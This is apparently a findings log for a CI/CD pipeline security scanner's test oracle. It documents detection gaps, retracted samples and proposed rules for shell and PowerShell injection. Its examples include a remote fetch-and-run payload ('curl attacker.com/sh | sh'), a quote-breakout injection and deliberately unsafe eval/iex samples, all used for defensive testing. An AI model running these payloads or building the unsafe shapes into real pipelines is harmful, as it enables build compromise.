# Oracle findings log

Observations from each run of the semantic-grammar oracle
(`tests/integration/test_grammar_oracle.py`).

Format: one section per distinct finding. Each finding has an ID, a
date, a status, a short description, the offending sample, the rule
involved (if any), and a resolution path. Findings that are later
fixed stay in the log with status = resolved; the xfail that
tracked them in the test file gets removed in the same PR that
ships the fix.

---

## F-1 — `SEC4-GL-001` fires inside quoted-heredoc bodies

**Filed:** oracle initial run (this PR)
**Status:** open — tracked by `@pytest.mark.xfail(strict=True)` in
`test_no_rule_fires_on_safe_sample`.
**Severity:** precision gap (false positive in the common shell
heredoc idiom). Not a recall or security gap.

### Symptom

```yaml
- run: |
    cat <<'EOF'
    $CI_COMMIT_MESSAGE stays literal
    EOF
```

`SEC4-GL-001` (`User-controlled GitLab CI variable used unquoted in
shell script`) fires on line 3. The shell NEVER expands
`$CI_COMMIT_MESSAGE` here — the heredoc sentinel is quoted (`<<'EOF'`),
which per the bash manual §3.6.6 suppresses parameter expansion on the
body. No injection is possible.

### Root cause

`SEC4-GL-001` is a `RegexPattern` with a line-level regex
`\$\{?(CI_COMMIT_MESSAGE|CI_MERGE_REQUEST_TITLE|...)\}?`. It has
exclusions for double-quoted usage (`"$VAR"`) and single-quoted usage
(added in PR #27 to fix Bug 23), but no exclusion for lines appearing
inside a heredoc whose opening marker was quoted.

Fixing this requires understanding multi-line context that the current
line-level regex can't see. Two plausible paths:

1. **Structural fix**: migrate `SEC4-GL-001` to a pattern type that
   tracks heredoc scope (would need a mini shell lexer). Overkill for
   one rule.
2. **Heuristic fix**: scan a job segment for `<<['"]?EOF['"]?` / `EOF`
   pairs as a pre-pass and mask the lines between them before rule
   evaluation. Cheap, catches the common idiom. Misses unusual
   heredoc sentinels.

**Recommended:** option 2, implemented in `taintly/models.py`'s
scope-=job handling. Roughly 30 lines. Follow-up PR.

### Reproduction

```bash
pytest tests/integration/test_grammar_oracle.py::test_no_rule_fires_on_safe_sample -v \
  -k heredoc_quoted_marker
```

The xfail marker reports XFAIL today; when the fix lands, removing the
xfail (and with `xfail_strict=true` already set in `pyproject.toml`)
will gate the fix from regressing.

### Samples retained in the grammar

Only the variant that references `$CI_COMMIT_MESSAGE` (a tainted
predefined GitLab variable). The `${NOT_A_VAR}` and `${also_literal}`
heredoc variants pass the oracle cleanly — they're kept in the
grammar because they exercise heredoc syntax (single-quoted, double-
quoted, backslash-quoted markers) without sharing the FP trigger.

---

## F-2 — No rule covers `eval` on double-quoted user input

**Filed:** oracle initial run (this PR)
**Status:** open — tracked by `@pytest.mark.xfail(strict=True)` in
`test_some_rule_fires_on_unsafe_sample`.
**Severity:** recall gap (false negative).

### Symptom

```yaml
- run: eval "$CI_COMMIT_MESSAGE"
```

No rule fires. `eval` re-parses its string argument AS SHELL SOURCE; a
PR commit message of `; curl attacker.com/sh | sh` executes as part of
the build. This is textbook shell injection and the existing ruleset
has nothing specifically addressing the `eval` vector.

(The unquoted variant `eval $CI_COMMIT_BRANCH` IS caught, but only
incidentally by `SEC4-GL-001`'s generic "unquoted CI variable" regex.
The fix should cover `eval` as an explicit sink.)

### Proposed rule

New rule `SEC4-GL-007` (or similar — pick the next free slot in
`taintly/rules/gitlab/`). Shape:

```python
Rule(
    id="SEC4-GL-007",
    title="eval on user-controlled shell input",
    severity=Severity.HIGH,
    platform=Platform.GITLAB,
    owasp_cicd="CICD-SEC-4",
    pattern=RegexPattern(
        match=r"\beval\s+['\"]?\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_BRANCH|...)",
        exclude=[r"^\s*#"],
    ),
    ...
)
```

A cross-platform variant (`SEC4-GH-NNN`) covers GitHub Actions shell
substitutions into `eval`; another (`SEC4-JK-NNN`) covers Groovy's
`groovy.util.Eval.me`. Scope decision: single PR per platform or one
cross-cutting PR — maintainer's call.

### Samples retained in the grammar

Two `eval_on_dynamic_input` samples (`eval "$CI_COMMIT_MESSAGE"` and
`eval $CI_COMMIT_BRANCH`). The first is xfailed (the real
uncovered case). The second passes incidentally through `SEC4-GL-001`
and exercises that cross-over.

---

## F-3 — Sample retractions from the grammar

Samples that were once proposed (or originally shipped) and later
retracted because their semantic claim did not hold unconditionally.
Documented here so follow-up reviewers don't re-add them thinking
they were oversights. `RETRACTED_SAMPLES` in the test file mirrors
this list programmatically; `test_retracted_samples_do_not_reappear`
guards against silent re-introduction.

### F-3a — `echo '${{ github.event.pull_request.title }}'`

Originally proposed for `single_quoted_shell_var`.

**Why it's not safe:** GitHub Actions substitutes `${{ }}` at
workflow-parse time, BEFORE the shell sees the line. An attacker who
includes a `'` (single quote) in the PR title renders as:

```
echo 'foo'; attacker_command; echo 'bar'
```

— breaking out of the single quote and executing arbitrary shell.
The single-quote protection applies only to shell-level `$VAR`
syntax, not to GitHub-Actions-level `${{ }}` interpolation.

**Resolution:** retracted. Per DESIGN.md §CR-2, context-dependent
safety belongs in per-rule `test_positive`/`test_negative`, not in
the oracle grammar.

### F-3b — `# never do: sh "deploy ${params.BRANCH}"`

Originally proposed for `yaml_comment_lines`.

**Why it was an oracle-scope error:** the sample embeds a Jenkins-
style `sh "..."` string inside a YAML `#` comment. In a real
Jenkinsfile the scanner wouldn't see this (Groovy uses `//`
comments), but the oracle evaluates ALL rules against ALL samples
regardless of platform. `SEC4-JK-001` has no `#`-comment exclusion
because it was never expected to run on YAML-comment context — so
it fires.

**Resolution:** retracted. The oracle's cross-platform evaluation
is the design; cross-platform comment-style confusion isn't an
oracle-relevant safety claim. Real engine routing in
`engine.scan_file` handles it correctly via platform filtering.

### F-3c — `deploy.sh "$CI_COMMIT_BRANCH"`

Originally in `double_quoted_shell_var_passed_to_echo`. Retracted
per external audit feedback on PR #39 (refactor pass).

**Why it was an oracle-scope error:** the category's safety claim
is that `echo` / `printf` do not re-parse their arguments. For
`deploy.sh`, whether the argument is re-parsed depends on what
`deploy.sh` does internally (may `eval`, may pass to another
command unquoted). That's a property of `deploy.sh`, not of bash
quoting — so the sample doesn't belong in a category defined by a
bash-semantic invariant. The audit put it this way: "The OWASP
guidance you're citing says the quoting shape is safe, not that
the downstream consumer is safe."

**Resolution:** retracted from SAFE; the category was renamed in
spirit (premise text updated in DESIGN.md) to make the echo-
specific safety claim explicit. Replaced the sample with
`printf "%s\n" "$CI_COMMIT_MESSAGE"` — `printf` with `%s` has the
same non-re-parsing property.

### F-3d — `pwsh -c 'iex "$($MyVariable)"'`

Originally in `powershell_iex_local_file`. Retracted per external
audit feedback on PR #39.

**Why it was mislabelled:** the category's premise is `iex` on a
local-file read with no remote fetch. This sample has no file
read; it's `iex` on a double-quoted string with a subexpression —
the PowerShell equivalent of shell `eval "$VAR"`. If the
interpolated value is attacker-influenced, it re-parses as code.

**Resolution:** moved to a new UNSAFE category
`iex_on_interpolated_string`. Because no existing rule targets
this shape, the sample is xfail-strict and tracked as F-4 below.

---

## F-4 — No rule covers `iex` on an interpolated string

**Filed:** refactor pass of PR #39
**Status:** open — tracked by `Sample.xfail_reason` in
`UNSAFE_BY_CONSTRUCTION["iex_on_interpolated_string"]`.
**Severity:** recall gap (false negative).

### Symptom

```yaml
- run: pwsh -c 'iex "$($MyVariable)"'
```

No rule fires. `iex "$(...)"` re-parses the interpolated
subexpression as PowerShell source — structurally the same bug as
`eval "$VAR"` in shell (F-2). `SEC6-GH-007`'s `iex` branch only
targets the remote-fetch shapes (`DownloadString`, `WebClient`,
`Net.Http*`), not generic interpolated-subexpression arguments.

### Proposed rule

Add an `iex` variant that fires on `Invoke-Expression` / `iex`
invoked with a double-quoted-string-plus-subexpression argument.
Exclude the local-file-read forms (`Get-Content`, `Type`) already
covered as safe in `powershell_iex_local_file`.

---

## F-5 — Rules tied to hardcoded variable-name lists, not to shape

**Filed:** EXT-C (mutation harness) initial run
**Status:** open — tracked by `_KNOWN_MUTATION_GAPS` in
`tests/integration/test_grammar_oracle_mutations.py` (3 xfail-strict
entries today).
**Severity:** precision gap (the rule fires for the *wrong reason*
when it does fire — the variable name happens to match — and misses
when the variable name doesn't).

### Symptom

The grammar mutation harness (EXT-C) flips a SAFE sample into its
minimally-unsafe variant and asserts at least one rule fires. Three
mutations pass-through silently today:

| Sample | Mutation | Why no rule fires |
|---|---|---|
| `echo '$GITHUB_REF_NAME is safe'` | `echo $GITHUB_REF_NAME is safe` | `$GITHUB_REF_NAME` is not in any rule's hardcoded variable name list. |
| `<<"EOF" ... ${NOT_A_VAR} ...` | `<<EOF ... ${NOT_A_VAR} ...` | `${NOT_A_VAR}` is not in any list. |
| `<<\EOF ... ${also_literal} ...` | `<<EOF ... ${also_literal} ...` | Same. |

In each case the original SAFE sample correctly produces no firing
(the quoting/heredoc-marker is the safety surface), but the unquoted
mutation also produces no firing — meaning the rule isn't recognising
the **shape** "unquoted shell variable in attacker-influenced
context"; it's recognising **specific variable names** that happen to
appear in the existing UNSAFE samples.

### Root cause

`SEC4-GL-001` and its peers carry a regex of the form
`\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_TITLE|...)\}?`
— an enumeration of GitLab predefined CI variables known to be
attacker-influenced. That's a reasonable optimisation when the goal
is precision (low false positives), but it leaves three blind spots:

1. **GitHub Actions auto-populated env vars** like `$GITHUB_REF_NAME`,
   `$GITHUB_HEAD_REF`, `$GITHUB_ACTOR`. There is no GitHub-equivalent
   of SEC4-GL-001 covering shell-level reads of these.
2. **User-defined env: blocks** that interpolate from
   `${{ github.event.* }}` and then read the env var unquoted.
   SEC4-GH-004 catches the `${{ }}` substitution itself, but not the
   downstream unquoted read.
3. **Heredoc bodies with arbitrary `${...}` references**. Even if the
   variable were tainted, the rule's name list wouldn't match.

### Proposed fix paths

**Option 1 — broaden by syntactic shape.** Add a low-confidence
"unquoted `$VAR` in shell-with-attacker-control-context" rule that
fires on *any* unquoted variable inside a workflow whose triggers
include `pull_request_target` / `issue_comment` / `pull_request`.
This trades precision for recall and would need `confidence="medium"`
+ `review_needed=True`.

**Option 2 — add named-list entries for GitHub-Actions auto-populated
vars.** Mechanical extension of the existing pattern. Catches case
(1) cleanly; misses (2) and (3).

**Option 3 — leave the rule as-is and accept the gap.** Treat
mutation findings as informational only. Defensible if the rule
authors believe shape-based detection's FP rate is too high. The
xfail markers stay in place permanently as documented coverage.

The maintainer's call. Either way, the mutation harness now keeps
the gap visible.

### Reproduction

```bash
pytest tests/integration/test_grammar_oracle_mutations.py -v
```

The xfail markers report XFAIL today; if any underlying rule changes
to widen its match, the strict xfail will flip to XPASS and the
build will fail, prompting allowlist removal.

---

## Run log

| Date | Added | Fixed | Open FPs | Open FNs | Total samples |
|---|---|---|---|---|---|
| oracle initial run | — | — | 1 (F-1) | 1 (F-2) | 41 SAFE + 15 UNSAFE |
| refactor pass (this PR) | F-3c, F-3d, F-4 retraction / classification fixes | — | 1 (F-1) | 2 (F-2, F-4) | 23 SAFE + 16 UNSAFE (1 retraction set) |
| EXT-C mutation harness | F-5 (3 mutation gaps) | — | 1 (F-1) | 2 (F-2, F-4) + 3 (F-5 mutations) | unchanged grammar; 13 mutation cases (3 xfail) |
